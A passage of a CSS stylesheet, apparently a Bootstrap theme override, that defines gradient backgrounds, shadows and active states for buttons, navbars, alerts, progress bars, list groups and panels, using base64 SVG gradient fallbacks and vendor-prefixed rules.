    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2VkMjMwNCIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNhZTAwMDAiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
    background: -moz-linear-gradient(top, #ed2304 0%, #ae0000 100%);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#ed2304), color-stop(100%,#ae0000));
    background: -webkit-linear-gradient(top, #ed2304 0%,#ae0000 100%);
    background: -o-linear-gradient(top, #ed2304 0%,#ae0000 100%);
    background: -ms-linear-gradient(top, #ed2304 0%,#ae0000 100%);
    background: linear-gradient(to bottom, #ed2304 0%,#ae0000 100%);
}

.btn-primary:active, .btn-primary.active {
    background-color: #AE0000;
    border-color: #760000;
}

.btn-success {
    border-color: #419641;
    background: #5cb85c;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iIzVjYjg1YyIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiM0NDlkNDQiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
    background: -moz-linear-gradient(top, #5cb85c 0%, #449d44 100%);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#5cb85c), color-stop(100%,#449d44));
    background: -webkit-linear-gradient(top, #5cb85c 0%,#449d44 100%);
    background: -o-linear-gradient(top, #5cb85c 0%,#449d44 100%);
    background: -ms-linear-gradient(top, #5cb85c 0%,#449d44 100%);
    background: linear-gradient(to bottom, #5cb85c 0%,#449d44 100%);
}

.btn-success:active, .btn-success.active {
    background-color: #AE0000;
    border-color: #419641;
}

.btn-warning {
    border-color: #eb9316;
    background: #f0ad4e;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2YwYWQ0ZSIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNlYzk3MWYiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
    background: -moz-linear-gradient(top, #f0ad4e 0%, #ec971f 100%);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#f0ad4e), color-stop(100%,#ec971f));
    background: -webkit-linear-gradient(top, #f0ad4e 0%,#ec971f 100%);
    background: -o-linear-gradient(top, #f0ad4e 0%,#ec971f 100%);
    background: -ms-linear-gradient(top, #f0ad4e 0%,#ec971f 100%);
    background: linear-gradient(to bottom, #f0ad4e 0%,#ec971f 100%);
}

.btn-warning:active, .btn-warning.active {
    background-color: #ec971f;
    border-color: #eb9316;
}

.btn-danger {
    border-color: #c12e2a;
    background: #d9534f;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2Q5NTM0ZiIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNjOTMwMmMiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
    background: -moz-linear-gradient(top, #d9534f 0%, #c9302c 100%);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#d9534f), color-stop(100%,#c9302c));
    background: -webkit-linear-gradient(top, #d9534f 0%,#c9302c 100%);
    background: -o-linear-gradient(top, #d9534f 0%,#c9302c 100%);
    background: -ms-linear-gradient(top, #d9534f 0%,#c9302c 100%);
    background: linear-gradient(to bottom, #d9534f 0%,#c9302c 100%);
}

.btn-danger:active, .btn-danger.active {
    background-color: #c9302c;
    border-color: #c12e2a;
}

.btn-info {
    border-color: #2aabd2;
    background: #5bc0de;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iIzViYzBkZSIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiMzMWIwZDUiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
    background: -moz-linear-gradient(top, #5bc0de 0%, #31b0d5 100%);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#5bc0de), color-stop(100%,#31b0d5));
    background: -webkit-linear-gradient(top, #5bc0de 0%,#31b0d5 100%);
    background: -o-linear-gradient(top, #5bc0de 0%,#31b0d5 100%);
    background: -ms-linear-gradient(top, #5bc0de 0%,#31b0d5 100%);
    background: linear-gradient(to bottom, #5bc0de 0%,#31b0d5 100%);
}

.btn-info:active, .btn-info.active {
    background-color: #31b0d5;
    border-color: #2aabd2;
}

.thumbnail, .img-thumbnail {
    -webkit-box-shadow: 0 1px 2px rgba(0, 0, 0, 0.075);
    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.075);
}

.dropdown-menu > li > a:hover, .dropdown-menu > li > a:focus, .dropdown-menu > .active > a, .dropdown-menu > .active > a:hover, .dropdown-menu > .active > a:focus {
    background-color: #eee;
    color: #000;
    /*
  background-image: -webkit-gradient(linear, left 0%, left 100%, from(#CDCDCD), to(#E7E7E7));
  background-image: -webkit-linear-gradient(top, #CDCDCD, 0%, #E7E7E7, 100%);
  background-image: -moz-linear-gradient(top, #CDCDCD 0%, #E7E7E7 100%);
  background-image: linear-gradient(to bottom, #CDCDCD 0%, #E7E7E7 100%);
  background-repeat: repeat-x;
  filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffCDCDCD', endColorstr='#ffE7E7E7', GradientType=0);
  */
}

.navbar {
    border-radius: 4px;
    -webkit-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.15), 0 1px 5px rgba(0, 0, 0, 0.075);
    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.15), 0 1px 5px rgba(0, 0, 0, 0.075);
    background: #ffffff;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2ZmZmZmZiIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNmOGY4ZjgiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
    background: -moz-linear-gradient(top, #ffffff 0%, #f8f8f8 100%);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#ffffff), color-stop(100%,#f8f8f8));
    background: -webkit-linear-gradient(top, #ffffff 0%,#f8f8f8 100%);
    background: -o-linear-gradient(top, #ffffff 0%,#f8f8f8 100%);
    background: -ms-linear-gradient(top, #ffffff 0%,#f8f8f8 100%);
    background: linear-gradient(to bottom, #ffffff 0%,#f8f8f8 100%);
}

.navbar .navbar-nav > .active > a {
    background-color: #f8f8f8;
}

.navbar-brand, .navbar-nav > li > a {
    text-shadow: 0 1px 0 rgba(255, 255, 255, 0.25);
}

.navbar-inverse {
    background: #3c3c3c;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iIzNjM2MzYyIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiMyMjIyMjIiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
    background: -moz-linear-gradient(top, #3c3c3c 0%, #222222 100%);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#3c3c3c), color-stop(100%,#222222));
    background: -webkit-linear-gradient(top, #3c3c3c 0%,#222222 100%);
    background: -o-linear-gradient(top, #3c3c3c 0%,#222222 100%);
    background: -ms-linear-gradient(top, #3c3c3c 0%,#222222 100%);
    background: linear-gradient(to bottom, #3c3c3c 0%,#222222 100%);
}

.navbar-inverse .navbar-nav > .active > a {
    background-color: #222222;
}

.navbar-inverse .navbar-brand, .navbar-inverse .navbar-nav > li > a {
    text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.25);
}

.navbar-static-top, .navbar-fixed-top, .navbar-fixed-bottom {
    border-radius: 0;
}

.alert {
    text-shadow: 0 1px 0 rgba(255, 255, 255, 0.2);
    -webkit-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.25), 0 1px 2px rgba(0, 0, 0, 0.05);
    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.25), 0 1px 2px rgba(0, 0, 0, 0.05);
}

.alert-success {
    border-color: #b2dba1;
    background: #dff0d8;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2RmZjBkOCIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNjOGU1YmMiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
    background: -moz-linear-gradient(top, #dff0d8 0%, #c8e5bc 100%);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#dff0d8), color-stop(100%,#c8e5bc));
    background: -webkit-linear-gradient(top, #dff0d8 0%,#c8e5bc 100%);
    background: -o-linear-gradient(top, #dff0d8 0%,#c8e5bc 100%);
    background: -ms-linear-gradient(top, #dff0d8 0%,#c8e5bc 100%);
    background: linear-gradient(to bottom, #dff0d8 0%,#c8e5bc 100%);
}

.alert-info {
    border-color: #9acfea;
    background: #d9edf7;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2Q5ZWRmNyIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNiOWRlZjAiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
    background: -moz-linear-gradient(top, #d9edf7 0%, #b9def0 100%);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#d9edf7), color-stop(100%,#b9def0));
    background: -webkit-linear-gradient(top, #d9edf7 0%,#b9def0 100%);
    background: -o-linear-gradient(top, #d9edf7 0%,#b9def0 100%);
    background: -ms-linear-gradient(top, #d9edf7 0%,#b9def0 100%);
    background: linear-gradient(to bottom, #d9edf7 0%,#b9def0 100%);
}

.alert-warning {
    border-color: #f5e79e;
    background: #fcf8e3;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2ZjZjhlMyIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNmOGVmYzAiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
    background: -moz-linear-gradient(top, #fcf8e3 0%, #f8efc0 100%);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#fcf8e3), color-stop(100%,#f8efc0));
    background: -webkit-linear-gradient(top, #fcf8e3 0%,#f8efc0 100%);
    background: -o-linear-gradient(top, #fcf8e3 0%,#f8efc0 100%);
    background: -ms-linear-gradient(top, #fcf8e3 0%,#f8efc0 100%);
    background: linear-gradient(to bottom, #fcf8e3 0%,#f8efc0 100%);
}

.alert-danger {
    border-color: #dca7a7;
    background: #f2dede;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2YyZGVkZSIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNlN2MzYzMiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
    background: -moz-linear-gradient(top, #f2dede 0%, #e7c3c3 100%);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#f2dede), color-stop(100%,#e7c3c3));
    background: -webkit-linear-gradient(top, #f2dede 0%,#e7c3c3 100%);
    background: -o-linear-gradient(top, #f2dede 0%,#e7c3c3 100%);
    background: -ms-linear-gradient(top, #f2dede 0%,#e7c3c3 100%);
    background: linear-gradient(to bottom, #f2dede 0%,#e7c3c3 100%);
}

.progress {
    background-image: -webkit-gradient(linear, left 0%, left 100%, from(#ebebeb), to(#f5f5f5));
    background-image: -webkit-linear-gradient(top, #ebebeb, 0%, #f5f5f5, 100%);
    background-image: -moz-linear-gradient(top, #ebebeb 0%, #f5f5f5 100%);
    background-image: linear-gradient(to bottom, #ebebeb 0%, #f5f5f5 100%);
    background-repeat: repeat-x;
}

.progress-bar {
    background-image: -webkit-gradient(linear, left 0%, left 100%, from(#428bca), to(#3071a9));
    background-image: -webkit-linear-gradient(top, #428bca, 0%, #3071a9, 100%);
    background-image: -moz-linear-gradient(top, #428bca 0%, #3071a9 100%);
    background-image: linear-gradient(to bottom, #428bca 0%, #3071a9 100%);
    background-repeat: repeat-x;
}

.progress-bar-success {
    background-image: -webkit-gradient(linear, left 0%, left 100%, from(#5cb85c), to(#449d44));
    background-image: -webkit-linear-gradient(top, #5cb85c, 0%, #449d44, 100%);
    background-image: -moz-linear-gradient(top, #5cb85c 0%, #449d44 100%);
    background-image: linear-gradient(to bottom, #5cb85c 0%, #449d44 100%);
    background-repeat: repeat-x;
}

.progress-bar-info {
    background-image: -webkit-gradient(linear, left 0%, left 100%, from(#5bc0de), to(#31b0d5));
    background-image: -webkit-linear-gradient(top, #5bc0de, 0%, #31b0d5, 100%);
    background-image: -moz-linear-gradient(top, #5bc0de 0%, #31b0d5 100%);
    background-image: linear-gradient(to bottom, #5bc0de 0%, #31b0d5 100%);
    background-repeat: repeat-x;
}

.progress-bar-warning {
    background-image: -webkit-gradient(linear, left 0%, left 100%, from(#f0ad4e), to(#ec971f));
    background-image: -webkit-linear-gradient(top, #f0ad4e, 0%, #ec971f, 100%);
    background-image: -moz-linear-gradient(top, #f0ad4e 0%, #ec971f 100%);
    background-image: linear-gradient(to bottom, #f0ad4e 0%, #ec971f 100%);
    background-repeat: repeat-x;
}

.progress-bar-danger {
    background-image: -webkit-gradient(linear, left 0%, left 100%, from(#d9534f), to(#c9302c));
    background-image: -webkit-linear-gradient(top, #d9534f, 0%, #c9302c, 100%);
    background-image: -moz-linear-gradient(top, #d9534f 0%, #c9302c 100%);
    background-image: linear-gradient(to bottom, #d9534f 0%, #c9302c 100%);
    background-repeat: repeat-x;
}

.list-group {
    border-radius: 4px;
    -webkit-box-shadow: 0 1px 2px rgba(0, 0, 0, 0.075);
    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.075);
}

.list-group-item.active, .list-group-item.active:hover, .list-group-item.active:focus {
    text-shadow: 0 -1px 0 #3071a9;
    border-color: #3278b3;
    background: #428bca;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iIzQyOGJjYSIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiMzMjc4YjMiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
    background: -moz-linear-gradient(top, #428bca 0%, #3278b3 100%);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#428bca), color-stop(100%,#3278b3));
    background: -webkit-linear-gradient(top, #428bca 0%,#3278b3 100%);
    background: -o-linear-gradient(top, #428bca 0%,#3278b3 100%);
    background: -ms-linear-gradient(top, #428bca 0%,#3278b3 100%);
    background: linear-gradient(to bottom, #428bca 0%,#3278b3 100%);
}

.panel {
    -webkit-box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
}

.panel-default > .panel-heading {
    background: #f5f5f5;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2Y1ZjVmNSIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNlOGU4ZTgiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
    background: -moz-linear-gradient(top, #f5f5f5 0%, #e8e8e8 100%);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#f5f5f5), color-stop(100%,#e8e8e8));
    background: -webkit-linear-gradient(top, #f5f5f5 0%,#e8e8e8 100%);
    background: -o-linear-gradient(top, #f5f5f5 0%,#e8e8e8 100%);
    background: -ms-linear-gradient(top, #f5f5f5 0%,#e8e8e8 100%);
    background: linear-gradient(to bottom, #f5f5f5 0%,#e8e8e8 100%);
}

.panel-primary > .panel-heading {
    background: #428bca;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iIzQyOGJjYSIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiMzNTdlYmQiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
    background: -moz-linear-gradient(top, #428bca 0%, #357ebd 100%);
